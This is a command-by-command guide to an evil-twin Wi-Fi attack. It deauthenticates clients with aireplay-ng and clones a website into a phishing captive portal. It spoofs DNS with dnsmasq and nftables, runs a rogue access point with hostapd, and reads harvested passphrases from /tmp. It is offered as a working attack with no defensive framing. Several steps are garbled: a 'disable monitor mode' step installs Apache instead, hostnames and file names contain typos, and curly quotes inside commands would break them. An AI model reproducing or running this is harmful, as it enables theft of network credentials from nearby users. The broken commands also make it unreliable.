
This guide provides step-by-step instructions for setting up a wireless network monitoring and attack environment.

### 1. Set Interface to Monitor Mode

Begin by capturing information about clients and access points (APs) around you:

```bash
sudo airodump-ng wlan0mon
```

### 2. Adjust the Capture

To specify the capture details, use:

```bash
sudo airodump-ng -w fileName –output-format pcap -c channelnumber interface
```

### 3. De-authenticate Connected Devices

Wait until the WPA handshake is captured:

```bash
sudo aireplay-ng -0 amountOfdeauths -a ApBSSID interface
```

### 4. Disable Monitor Mode

After completing the capture, disable monitor mode:

```bash
sudo apt install apache2 libapache2-mod-php
```

### 5. Download the Example Page

Use `wget` to download the webpage. Here, `-l2` means to go 2 levels deep:

```bash
wget -r -l2 https://www.website.com
```

### 6. Prepare the Web Directory

Create a directory for the phishing webpage:

```bash
sudo mkdir /var/www/html/portal && sudo mousepad /var/www/html/portal/index.php
```

### 7. Replicate the Website's Style

Replicate the styling of the example website page and copy the assets:

```bash
sudo cp -r ./www.website.com/assets /var/www/html/portal
```

### 8. Set Up the Login Page

Configure the login page to redirect to `login_check.php`:

```bash
sudo mousepad /var/www/html/portal/login_check.php
```

### 9. Assign an IP address and activate the interface:

  ```bash
  sudo ip addr add 192.168.87.1/24 dev wlan0
  sudo ip link set wlan0 up
  ```

### 10. Ensure dnsmasq is installed:

```bash
sudo apt install dnsmasq
```

### 11. Create the DHCP config file at `/home/kali/dnsmasq.conf` and add spoofing entries for top-level domains:

```bash
address=/com/192.168.0.1
address=/org/192.168.0.1
address=/net/192.168.0.1
```

### 12. For Windows 7 & 10 captive portal detection, add:

```bash
address=/dns.msftncsicom/131.107.255.255  
```

### 13. Start dnsmasq with the config file:

```bash
sudo dnsmasq –conf-file=dnsmasq.com
```

### 14. Verify if dnsmasq is running successfully:

```bash
sudo tail /var/log/syslog | grep dnsmasq
```

### 15. Install nftables:

```bash
sudo apt install nftables
```

### 16. Add required rules:

```bash
sudo nft add table ip nat
sudo nft ‘add chain ip nat PREROUTING { type nat hook prerouting priority dstnat; policy; accept; }’
sudo nft add rule ip nat PREROUTING iifname “wlan0” udp dport 53 counter redirect to :53
```

### 17. Modify Apache configuration:

```bash
sudo mousepad /etc/apache2/sites-enabled/000-default.conf
```

### 18. Enable necessary modules and restart Apache:

```bash
sudo a2enmod rewrite && sudo a2enmod alias
sudo systemctl restart apache2
```

### 19. Check the portal by navigating to:

```bash
Firefox 127.0.0.1/portal/index.php
```

### 20. Install hostapd and edit the configuration:

```bash
sudo apt install hostapd && mousepad hostapd.conf
```

### 21. Create and run a 802.11n AP:

```bash
sudo hostapd -B hostapd.conf
```

### 22. Monitor the logs in two separate terminals:

- Terminal 1:

```bash
sudo tail -f /var/log/syslog | grep -E ‘(dnsmasq|hostapd)’
```

- Terminal 2:

```bash
sudo tail -f /var/log/apache2/access.log
```

### 23. Search for passphrase files in `/tmp/`:

```bash
sudo find /tmp/ -iname passphrase.txt
```

### 24. Read the contents of the passphrase file:

```bash
sudo cat /tmp/systemd-private-b37…aef-apache2.service-b...i/tmp/passphrase.txt
```
